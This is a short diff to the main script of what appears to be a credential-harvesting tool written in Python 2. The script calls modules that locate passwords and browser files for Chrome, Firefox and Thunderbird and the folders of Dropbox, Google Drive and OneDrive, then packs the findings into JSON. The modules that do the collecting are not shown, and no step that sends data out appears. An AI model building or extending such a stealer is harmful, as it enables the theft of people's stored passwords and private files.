@@ -9,19 +9,28 @@
 ###
 ####
 
-import cloud, browserfile, config
-
+import cloud, browserfile, config, packetizer
+import os, subprocess
 
 def main():
 	# find passwords and browser files
-	browserfile.chromeFinder()
-	browserfile.firefoxFinder()
-	browserfile.thunderbirdFinder()
+	chrome = browserfile.chromeFinder()
+	ffList = browserfile.firefoxFinder()
+	thList = browserfile.thunderbirdFinder()
 
 	# find cloud files
-	cloud.dropbox()
-	cloud.gdrive()
-	cloud.onedrive()
+	dropboxList = cloud.dropbox()
+
+	if config.OP_SYS == "Windows":
+		gdriveList = cloud.gdrive()
+		onedriveList = cloud.onedrive()
+
+	#pack all together
+
+	print "\n\n====== JSON Formatted Values ======="
+	packetizer.browserPack(chrome, "Chrome")
+	packetizer.browserPack(ffList, "Firefox")
+	packetizer.browserPack(thList, "Thunderbird")
 
 if __name__ == "__main__":
 	main()
